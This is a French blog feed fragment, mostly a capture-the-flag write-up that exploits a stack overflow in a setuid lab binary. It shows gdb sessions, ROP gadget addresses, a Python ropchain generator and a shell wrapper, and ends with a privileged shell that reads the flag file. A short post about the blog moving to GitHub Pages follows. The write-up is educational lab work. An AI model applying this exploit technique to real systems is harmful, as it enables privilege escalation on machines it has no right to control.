 R8 : 0x000000000000000A  R9 : 0x0000000002296740  R10: 0x0000000000000022  R11: 0x0000000000000246  R12: 0x0000000000000000
 R13: 0x0000000000401760  R14: 0x00000000004017F0  R15: 0x0000000000000000
 CS: 0033  DS: 0000  ES: 0000  FS: 0063  GS: 0000  SS: 002B                            Error while running hook_stop:
Cannot access memory at address 0x434343434343
0x0000434343434343 in ?? ()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Youpi les knackis!  Donc on a réussi à écrire dans &lt;code&gt;$rip&lt;/code&gt;. On met l&amp;rsquo;adresse de &lt;code&gt;mprotect()&lt;/code&gt; dans &lt;code&gt;$rip&lt;/code&gt;, on met un breakpoint sur l&amp;rsquo;instruction &lt;code&gt;ret&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;   [...]
   0x00000000004010e6 &amp;lt;+136&amp;gt;:   mov    eax,0x0
   0x00000000004010eb &amp;lt;+141&amp;gt;:   leave
   0x00000000004010ec &amp;lt;+142&amp;gt;:   ret
End of assembler dump.

gdb$ b *0x00000000004010ec
Breakpoint 1 at 0x4010ec

gdb$ r &amp;lt; &amp;lt;(perl -e &#39;print &amp;quot;A&amp;quot;x272 . &amp;quot;B&amp;quot;x6 . &amp;quot;\x00\x00&amp;quot; . &amp;quot;\x10\x4e\x43&amp;quot;&#39;)
[...]
=&amp;gt; 0x4010ec &amp;lt;main+142&amp;gt;: ret
[...]
Breakpoint 1, 0x00000000004010ec in main ()
gdb$ ni
=&amp;gt; 0x434e10 &amp;lt;mprotect&amp;gt;: mov    eax,0xa
   0x434e15 &amp;lt;mprotect+5&amp;gt;:       syscall
   0x434e17 &amp;lt;mprotect+7&amp;gt;:       cmp    rax,0xfffffffffffff001
   0x434e1d &amp;lt;mprotect+13&amp;gt;:      jae    0x438950 &amp;lt;__syscall_error&amp;gt;
   0x434e23 &amp;lt;mprotect+19&amp;gt;:      ret
   0x434e24:    nop    WORD PTR cs:[rax+rax*1+0x0]
   0x434e2e:    xchg   ax,ax
   0x434e30 &amp;lt;madvise&amp;gt;:  mov    eax,0x1c
-----------------------------------------------------------------------------------------------------------------------------
0x0000000000434e10 in mprotect ()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Bien!  Est-ce qu&amp;rsquo;on peut mettre les arguments voulus dans les registres idoines, maintenant?  Comment connaître la taille du segment mémoire qu&amp;rsquo;on veut rendre exécutable?  Et depuis où?  C&amp;rsquo;est très probablement faisable, mais je suis débutant et je ne vois pas comment faire, arrivé à ce stade.  C&amp;rsquo;est malin, j&amp;rsquo;aurais dû y penser plus tôt.  Du coup ça m&amp;rsquo;a l&amp;rsquo;air compromis, de ne faire que du ret2libc.  Va falloir passer par du ROP.&lt;/p&gt;

&lt;h2 id=&#34;bon-ben-va-falloir-passer-par-du-rop&#34;&gt;Bon&amp;hellip; ben va falloir passer par du ROP.&lt;/h2&gt;

&lt;p&gt;L&amp;rsquo;objectif est de trouver des séquences d&amp;rsquo;instructions dans la zone exécutable de la mémoire du processus, afin de les emboîter petit à petit pour arriver à une succession d&amp;rsquo;opérations qui feront quelque chose de particulier.  En l&amp;rsquo;occurrence, obtenir un shell avec les droits privilégiés.&lt;/p&gt;

&lt;p&gt;Récuperons un outil pour trouver des gadgets (c&amp;rsquo;est ainsi qu&amp;rsquo;on appelle ces séquences d&amp;rsquo;instructions).  Comme on n&amp;rsquo;a pas les droits en écriture dans le répertoire &lt;code&gt;$HOME&lt;/code&gt;, on va tout mettre en bordel dans &lt;code&gt;/tmp&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ mkdir /tmp/p
$ export PATH=$PATH:/tmp/p

$ wget https://github.com/downloads/0vercl0k/rp/rp-lin-x64 -O /tmp/p/
$ chmod +x /tmp/p/rp-lin-x64
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;On a choisi &lt;code&gt;rp++&lt;/code&gt; (il y en a d&amp;rsquo;autres, comme &lt;code&gt;ROPgadget&lt;/code&gt;), un peu par hasard.  C&amp;rsquo;est le premier venu quand j&amp;rsquo;ai fait une recherche sur Google et co,,e ce qu&amp;rsquo;on va faire est simple (on veut juste &lt;code&gt;pop&lt;/code&gt;-er des valeurs de la stack pour les mettre dans des registres) pas la peine de passer du temps à chercher l&amp;rsquo;outil qui possède les meilleures features&amp;hellip;&lt;/p&gt;

&lt;p&gt;On va tenter de faire exécuter un &lt;code&gt;execve()&lt;/code&gt; via des gadgets, du coup.  Ce qu&amp;rsquo;on souhaite, c&amp;rsquo;est faire executer &lt;code&gt;execve(&amp;quot;/bin/sh&amp;quot;, NULL, NULL);&lt;/code&gt;.  Notons que d&amp;rsquo;après la documentation de l&amp;rsquo;ABI du système, &lt;code&gt;$rax&lt;/code&gt; doit contenir le numéro du syscall (et le contenu sera écrasé lors du retour de fonction, si jamais il se produit&amp;hellip; dans notre cas on s&amp;rsquo;en moque, puisqu&amp;rsquo;on veut spawner un shell).  Il faudra donc mettre les registres dans l&amp;rsquo;état suivant:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt; RAX &amp;lt;- 0x3b (= 59, la valeur du syscall execve() sur 64bits)
 RDI &amp;lt;- &amp;quot;/bin/sh&amp;quot; ou quelque chose du genre
 RSI &amp;lt;- 0x00 (NULL)
 RDX &amp;lt;- 0x00 (NULL)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Donc, le layout de la stack en sortie de &lt;code&gt;main()&lt;/code&gt; devrait ressembler à quelque chose comme ceci:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[ AAA....AAAA | BBBBBB00 | @(pop rax; ret) | 0x3b | @(pop rdi; ret) | &amp;quot;/bin/sh&amp;quot; | @(pop rsi; ret) | 0x0  | @(pop rdx; ret) | 0x0 | @syscall ]
     ^                         ^
     |                         |
     buffer                    $rip écrasé par cette adresse
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Une fois arrivé à la fin de la fonction &lt;code&gt;main()&lt;/code&gt;, le système va donc exécuter les instructions dont l&amp;rsquo;adresse est stockée en &lt;code&gt;$rip&lt;/code&gt;, à savoir &lt;code&gt;pop rax; ret&lt;/code&gt;.  Quand cette suite d&amp;rsquo;instructions est en cours d&amp;rsquo;exécution, le haut de la stack devient alors le mot de 8 octets suivant (&lt;code&gt;0x0000003b&lt;/code&gt;), et c&amp;rsquo;est ce mot qui est &lt;code&gt;pop&lt;/code&gt;-é pour être mis dans &lt;code&gt;$rax&lt;/code&gt;.  On exécutera alors le &lt;code&gt;pop rdi; ret&lt;/code&gt;, qui prendra la valeur sur la stack à ce moment, à savoir l&amp;rsquo;adresse de la chaîne de caractères &lt;code&gt;&amp;quot;/bin/sh&amp;quot;&lt;/code&gt; pour la stocker dans &lt;code&gt;$rdi&lt;/code&gt;.  Et ainsi de suite.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ rp-lin-x64 --file ./prog --unique -r 1 | grep &amp;quot;pop rax&amp;quot;
[...]
0x0044d2b4: pop rax ; ret  ;  (8 found)

$ rp-lin-x64 --file ./prog --unique -r 1 | grep &amp;quot;pop rdi&amp;quot;
[...]
0x004016d3: pop rdi ; ret  ;  (163 found)

$ rp-lin-x64 -f prog --unique  -r 1 | grep &amp;quot;pop rsi&amp;quot;
[...]
0x004017e7: pop rsi ; ret  ;  (51 found)

$ rp-lin-x64 -f prog --unique  -r 1 | egrep &amp;quot;pop rdx&amp;quot;
[...]
0x00437205: pop rdx ; ret  ;  (2 found)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Et pour finir, on cherche l&amp;rsquo;appel à un syscall.  Notons encore une fois une difference entre x86 et x86-64: l&amp;rsquo;appel est &lt;code&gt;int 0x80&lt;/code&gt; sur 32 bits, alors qu&amp;rsquo;on utilise &lt;code&gt;syscall&lt;/code&gt; sur x86-64 (depend si on est sur intel ou amd)&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ rp-lin-x64 -f prog --unique -r 1 | grep syscall
[...]
0x00400488: syscall  ;  (95 found)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Bien, on a l&amp;rsquo;adresse à empiler en dernier!&lt;/p&gt;

&lt;p&gt;Maintenant, si vous avez fait attention, vous avez remarqué qu&amp;rsquo;on a zappé quelque chose!  On doit resoudre le probleme de la chaîne de caractères censée être utilisée par &lt;code&gt;execve()&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ nm -a ./ch34 | grep &amp;quot;/bin/sh&amp;quot;
$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;On ne trouve pas &lt;code&gt;&amp;quot;/bin/sh&amp;quot;&lt;/code&gt; dans le binaire, ni d&amp;rsquo;autres chemins susceptible de nous plaire&amp;hellip;  On va utiliser un trick:  trouver une chaîne de caractère dispo en mémoire, qui ne corresponde pas a une commande déjà existante, puis créer un wrapper à &lt;code&gt;/bin/dash&lt;/code&gt; qui portera le nom de cette chaîne.  Ce wrapper sera mis dans le répertoire &lt;code&gt;/tmp/p&lt;/code&gt;, qui est dans le &lt;code&gt;PATH&lt;/code&gt;.  Pourquoi &lt;code&gt;/bin/dash&lt;/code&gt; et pas &lt;code&gt;/bin/sh&lt;/code&gt; ou &lt;code&gt;/bin/bash&lt;/code&gt;?  Sur ce système, comme souvent, on a ça :&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ ls -l /bin/sh
lrwxrwxrwx 1 root root 4 mai   16  2015 /bin/sh -&amp;gt; bash
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Or il semble que &lt;code&gt;bash&lt;/code&gt; pose problème à cause de l&amp;rsquo;option &lt;code&gt;-p&lt;/code&gt; (pas référencée dans la &lt;code&gt;manpage&lt;/code&gt;, juste mentionnée dans un paragraphe), qui a cet effet:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;If the shell is started with the effective user (group) id not equal to the real user (group) id, and the -p option is not supplied, no startup files are read, shell functions are not inherited from the environment, the  SHEL‐
LOPTS,  BASHOPTS, CDPATH, and GLOBIGNORE variables, if they appear in the environment, are ignored, and the effective user id is set to the real user id.  If the -p option is supplied at invocation, the startup behavior is the
same, but the effective user id is not reset.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Du coup, plutôt que s&amp;rsquo;embêter à gérer ce cas particulier, autant utiliser &lt;code&gt;/bin/dash&lt;/code&gt; qui n&amp;rsquo;a pas ce genre de comportement.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ readelf -x .rodata ./prog | less
[...]
  0x00493c00 42654000 00000000 68654000 00000000 Be@.....he@.....
[...]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;On trouve la séquence &lt;code&gt;42654000&lt;/code&gt;, qui correspond à &lt;code&gt;&amp;quot;Be@&amp;quot;&lt;/code&gt; en ASCII, terminée par un nul-byte.  Son adresse est &lt;code&gt;0x00493c00&lt;/code&gt;, et on l&amp;rsquo;utilisera dans &lt;code&gt;$rdi&lt;/code&gt;.  Ensuite, on crée un petit shell script dans &lt;code&gt;/tmp/p&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ cat &amp;gt; /tmp/p/Be@
#!/bin/dash

/bin/dash
$ chmod +x /tmp/p/Be@
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ainsi, si &lt;code&gt;execve()&lt;/code&gt; invoque la commande &lt;code&gt;Be@&lt;/code&gt;, elle sera dans notre &lt;code&gt;PATH&lt;/code&gt;, et nous donnera un shell.  Magique non?  Ca évite une fastitieuse reconstruction d&amp;rsquo;un path type &lt;code&gt;&amp;quot;/bin/sh&amp;quot;&lt;/code&gt; via des gadgets.&lt;/p&gt;

&lt;p&gt;Boooon, que les choses sérieuses commencent!  On va construire notre ropchain maintenant, en prenant soin de respecter l&amp;rsquo;endianness:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ cat &amp;gt; /tmp/p/ropchain.py
#!/usr/bin/env python3

import sys
import struct

def main(argv):
   if len(argv) &amp;lt; 2:
    print(&amp;quot;Usage: %s &amp;lt;padding length&amp;gt;&amp;quot;, argv[0])
    raise SystemExit(-1)

    padding_len = int(argv[1])

    gadgets = []
    gadgets.append(struct.pack(&#39;&amp;lt;Q&#39;, 0x000000000044d2b4))  # pop rax; ret
    gadgets.append(struct.pack(&#39;&amp;lt;Q&#39;, 0x000000000000003b))  # store 59 on the stack
    gadgets.append(struct.pack(&#39;&amp;lt;Q&#39;, 0x00000000004016d3))  # pop rdi; ret
    gadgets.append(struct.pack(&#39;&amp;lt;Q&#39;, 0x0000000000493c00))  # addr of &amp;quot;Be@&amp;quot; to put in rsi
    gadgets.append(struct.pack(&#39;&amp;lt;Q&#39;, 0x00000000004017e7))  # pop rsi; ret
    gadgets.append(struct.pack(&#39;&amp;lt;Q&#39;, 0x0000000000000000))  # NULL pointer for args
    gadgets.append(struct.pack(&#39;&amp;lt;Q&#39;, 0x0000000000437205))  # pop rdx; ret
    gadgets.append(struct.pack(&#39;&amp;lt;Q&#39;, 0x0000000000000000))  # NULL pointer for envs
    gadgets.append(struct.pack(&#39;&amp;lt;Q&#39;, 0x0000000000400488))  # syscall

    payload = b&#39;A&#39; * (padding_len - 8) + b&#39;B&#39; * 6 + b&#39;\x00\x00&#39; + b&#39;&#39;.join(gadgets)
    print(payload)

if __name__ == &amp;quot;__main__&amp;quot;:
    main(sys.argv)
^D

$ sc=$(ropchain.py 280); export sc=${sc:2:-1}; echo $sc
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBB\x00\x00\x9f\xbdA\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x000\xec@\x00\x00\x00\x00\x00\x00&amp;lt;I\x00\x00\x00\x00\x00\xe7\x17@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05rC\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa7\x81K\x00\x00\x00\x00\x00&#39;\xe9J\x00\x00\x00\x00\x00
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;NOTE:  le &lt;code&gt;${sc:2:-1}&lt;/code&gt; permet de se débarrasser du &lt;code&gt;b&amp;quot;&lt;/code&gt; en début de chaîne et &lt;code&gt;&amp;quot;&lt;/code&gt; en fin de chaîne.  Il y a sûrement moyen de faire ça intelligemment mais je suis une bille en python, et j&amp;rsquo;avais pas de temps à perdre là-dessus!&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ gdb ./prog
[...]
gdb$ disas main
   [...]
   0x00000000004010e6 &amp;lt;+136&amp;gt;:   mov    eax,0x0
   0x00000000004010eb &amp;lt;+141&amp;gt;:   leave
   0x00000000004010ec &amp;lt;+142&amp;gt;:   ret
End of assembler dump.

gdb$ b *0x00000000004010ec
Breakpoint 1 at 0x4010ec

gdb$ r &amp;lt; &amp;lt;(perl -e &#39;print &amp;quot;&#39;$sc&#39;&amp;quot;&#39;)
Starting program: /home/usr/prog &amp;lt; &amp;lt;(perl -e &#39;print &amp;quot;&#39;$sc&#39;&amp;quot;&#39;)
[...]
=&amp;gt; 0x4010ec &amp;lt;main+142&amp;gt;: ret
   0x4010ed:    nop    DWORD PTR [rax]
[...]
Breakpoint 1, 0x00000000004010ec in main ()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;On regarde l&amp;rsquo;état de la stack, et on observe qu&amp;rsquo;on a correctement empilé les adresses de nos petits gadgets:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;gdb$ x/20gx $rsp - 30
0x3ac2bce0758:  0x4141414141414141      0x4141414141414141
0x3ac2bce0768:  0x4141414141414141      0x4141414141414141
0x3ac2bce0778:  0x0000011600000116      0x0000424242424242
0x3ac2bce0788:  0x000000000044d2b4      0x000000000000003b
0x3ac2bce0798:  0x00000000004016d3      0x0000000000493c00
0x3ac2bce07a8:  0x00000000004017e7      0x0000000000000000
0x3ac2bce07b8:  0x0000000000437205      0x0000000000000000
0x3ac2bce07c8:  0x0000000000400488      0x0000000000401700
0x3ac2bce07d8:  0x0000000000000000      0x38ae7d8e75b336fa
0x3ac2bce07e8:  0x3ff62a925f9536fa      0x0000000000000000

gdb$ x/i $rip
=&amp;gt; 0x4010ec &amp;lt;main+142&amp;gt;: ret

gdb$ x/2i 0x000000000044d2b4
   0x44d2b4 &amp;lt;__printf_fp+4676&amp;gt;: pop    rax
   0x44d2b5 &amp;lt;__printf_fp+4677&amp;gt;: ret

gdb$ x/2i 0x00000000004016d3
   0x4016d3 &amp;lt;__libc_setup_tls+515&amp;gt;:     pop    rdi
   0x4016d4 &amp;lt;__libc_setup_tls+516&amp;gt;:     ret

gdb$ x/2i 0x00000000004017e7
   0x4017e7 &amp;lt;__libc_csu_init+135&amp;gt;:      pop    rsi
   0x4017e8 &amp;lt;__libc_csu_init+136&amp;gt;:      ret

gdb$ x/2i 0x0000000000437205
   0x437205 &amp;lt;__lll_lock_wait_private+37&amp;gt;:       pop    rdx
   0x437206 &amp;lt;__lll_lock_wait_private+38&amp;gt;:       ret

gdb$ x/i 0x0000000000400488
   0x400488 &amp;lt;backtrace_and_maps+183&amp;gt;:   syscall
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vérifions également que la chaîne est celle attendue:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;gdb$ x/s 0x0000000000493c00
0x493c00:       &amp;quot;Be@&amp;quot;
gdb$ c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Bizarre, si j&amp;rsquo;execute instruction par instruction on voit que tout se passe comme espère, mais on n&amp;rsquo;a pas de shell, et le programme explose.  D&amp;rsquo;ailleurs pour confirmer, on peut utiliser &lt;code&gt;strace(1)&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ (perl -e &#39;print &amp;quot;&#39;$sc&#39;&amp;quot;&#39;) | strace ./prog
execve(&amp;quot;./prog&amp;quot;, [&amp;quot;./prog&amp;quot;], [/* 19 vars */]) = 0
uname({sys=&amp;quot;Linux&amp;quot;, node=&amp;quot;host&amp;quot;, ...}) = 0
brk(0)                                  = 0x44cf490
brk(0x44d0650)                          = 0x44d0650
arch_prctl(ARCH_SET_FS, 0x44cfd40)      = 0
readlink(&amp;quot;/proc/self/exe&amp;quot;, &amp;quot;/home/user/prog&amp;quot;, 4096) = 32
brk(0x44f1650)                          = 0x44f1650
brk(0x44f2000)                          = 0x44f2000
access(&amp;quot;/etc/ld.so.nohwcap&amp;quot;, F_OK)      = -1 ENOENT (No such file or directory)
fstat(0, {st_mode=S_IFIFO|0600, st_size=0, ...}) = 0
mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x3811996c000
read(0, &amp;quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&amp;quot;..., 4096) = 352
read(0, &amp;quot;&amp;quot;, 4096)                       = 0
fstat(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 6), ...}) = 0
mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x3811996b000
write(1, &amp;quot;Hex result: 41414141414141414141&amp;quot;..., 569Hex result: 414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141160100000c010000424242424242) = 569
execve(&amp;quot;Be@&amp;quot;, [0], [/* 0 vars */])      = -1 ENOENT (No such file or directory)
--- SIGSEGV {si_signo=SIGSEGV, si_code=SI_KERNEL, si_addr=0} ---
+++ killed by SIGSEGV +++
Segmentation fault
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;On remarque la ligne:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;execve(&amp;quot;Be@&amp;quot;, [0], [/* 0 vars */])      = -1 ENOENT (No such file or directory)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;On est content, on a la confirmation qu&amp;rsquo;&lt;code&gt;execve()&lt;/code&gt; est appelé, et avec les bons arguments qui plus est!  Tout va bien sauf que&amp;hellip; &lt;code&gt;&amp;quot;Be@&amp;quot;&lt;/code&gt; n&amp;rsquo;est pas trouvé (&lt;code&gt;ENOENT&lt;/code&gt;)!  En fait le programme regarde dans le &lt;code&gt;CWD&lt;/code&gt; et ne trouve rien.  Donc &lt;code&gt;execve()&lt;/code&gt; échoue et on passe à l&amp;rsquo;instruction suivante&amp;hellip; qu&amp;rsquo;on n&amp;rsquo;a pas gérée, &lt;code&gt;$rip&lt;/code&gt; contient donc une adresse arbitraire, le programme saute à cette adresse et plante lamentablement.  Il faut donc qu&amp;rsquo;on exécute notre programme depuis le répertoire contenant notre wrapper a &lt;code&gt;/bin/dash&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ cd /tmp/p &amp;amp;&amp;amp; (perl -e &#39;print &amp;quot;&#39;$sc&#39;&amp;quot;&#39;) | strace ~/prog
[...]
rt_sigaction(SIGTERM, NULL, {SIG_DFL, [], 0}, 8) = 0
rt_sigaction(SIGTERM, {SIG_DFL, ~[RTMIN RT_1], SA_RESTORER, 0x28c41d06cb0}, NULL, 8) = 0
read(10, &amp;quot;#!/bin/dash\n\n/bin/dash\n&amp;quot;, 8192) = 23
clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x28c422a5a10) = 3704
wait4(-1, [{WIFEXITED(s) &amp;amp;&amp;amp; WEXITSTATUS(s) == 0}], 0, NULL) = 3704
--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=3704, si_status=0, si_utime=0, si_stime=0} ---
rt_sigreturn()                          = 3704
read(10, &amp;quot;&amp;quot;, 8192)                      = 0
exit_group(0)                           = ?
+++ exited with 0 +++
$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ok, notre programme rend la main immédiatement.  Il a dû prendre un &lt;code&gt;EOF&lt;/code&gt; ou une séquence terminant le shell.  On va utiliser le trick du built-in &lt;code&gt;cat&lt;/code&gt;, pour maintenir le stdin ouvert (et on ajoute un &lt;code&gt;\n&lt;/code&gt; pour flusher les buffers):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ (perl -e &#39;print &amp;quot;&#39;$sc&#39;&amp;quot; . &amp;quot;\n&amp;quot;&#39;; cat) |  ~/prog
Hex result: 414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141160100000c010000424242424242
whoami
user-cracked
ls
Be@  ropchain.py  rp-lin-x64
cd /home/user
ls -a
.passwd prog prog.c
cat .passwd
CeciEstMonFlagTagadaTsoinTsoin!
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Et voilà!  Youpi!&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>On est sur Github Pages!!! rholallalala</title>
      <link>https://unix4fun.github.io/post/on-est-sur-githubpages/</link>
      <pubDate>Sun, 02 Oct 2016 10:48:23 +0200</pubDate>
      
      <guid>https://unix4fun.github.io/post/on-est-sur-githubpages/</guid>
      <description>&lt;p&gt;Tout est dit!&lt;/p&gt;

&lt;p&gt;On utilise donc &lt;a href=&#34;https://gohugo.io/&#34;&gt;Hugo&lt;/a&gt; et on hoste sur &lt;a href=&#34;https://pages.github.com/&#34;&gt;GitHub Pages&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Avant on etait &lt;a href=&#34;https://blog.unix4fun.net&#34;&gt;blog.unix4fun.net&lt;/a&gt;, desormais, nous sommes &lt;a href=&#34;https://unix4fun.github.io&#34;&gt;unix4fun.github.io&lt;/a&gt;. L&amp;rsquo;ancien blog et les posts restent disponibles et on espere etre un peu plus actifs par ici&amp;hellip;&lt;/p&gt;

&lt;p&gt;voila, voila, en vous remerciant!&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Exploiter un stack overflow à l&#39;ancienne.</title>
      <link>https://unix4fun.github.io/post/exploiter-un-stack-overflow/</link>
      <pubDate>Fri, 23 Sep 2016 07:38:13 +0200</pubDate>
      
      <guid>https://unix4fun.github.io/post/exploiter-un-stack-overflow/</guid>
      <description>&lt;p&gt;Youpla la compagnie! Ça fait un bail non? :) Bon, récemment je me suis mis à regarder un peu les vieilles failles de sécu des années 90&amp;rsquo;/début 2000. Ok ok, de nos jours c&amp;rsquo;est complètement différent, on a des milliards de protections (PIE, ASLR, relro, stack canary, etc). Mais pour ma culture générale, j&amp;rsquo;ai voulu regarder. J&amp;rsquo;ai donc cherché sur google un site proposant des challenges, et je suis tombé sur l&amp;rsquo;un d&amp;rsquo;eux qui est vraiment bien fichu: il propose une dizaine de catégories (web, cryptanalyse, crackme, exploitation système, etc). Il propose de se connecter sur des machines où l&amp;rsquo;environnement est déjà préparé, etc.&lt;/p&gt;

&lt;p&gt;NOTE: je ne le nomme pas, non pas pour ne pas faire de la publicité, mais parce qu&amp;rsquo;en traînant un peu mes guêtre par là, les administrateurs n&amp;rsquo;aiment pas trop que les solutions se trouvent trop facilement sur le net. Donc je vais tenter de rendre la recherche de solution un peu plus compliquée tout en restant cohérent (j&amp;rsquo;espère).&lt;/p&gt;

&lt;p&gt;Donc jy bondis:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;maison$ ssh -p 2222 user@&amp;lt;hostname&amp;gt;
[...]
$ ls -la
total 28
dr-xr-x---  2 user-cracked user          4096 May 21  2015 .
drwxr-xr-x 22 root root                  4096 Mar  2  2016 ..
-r-sr-x---  1 user-cracked user         10511 May  4  2013 prog
-r--r-----  1 user         user          1277 Jan  7  2011 prog.c
-r--r-----  1 user-cracked user-cracked    13 Feb  8  2012 .passwd
$ id
uid=1110(user) gid=1110(user) groups=1110(user),100(users)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;L&amp;rsquo;objectif ici est d&amp;rsquo;exécuter le programme &amp;ldquo;prog&amp;rdquo;, qui est setuid, et de l&amp;rsquo;exploiter pour pouvoir lire le contenu du fichier .passwd.&lt;/p&gt;

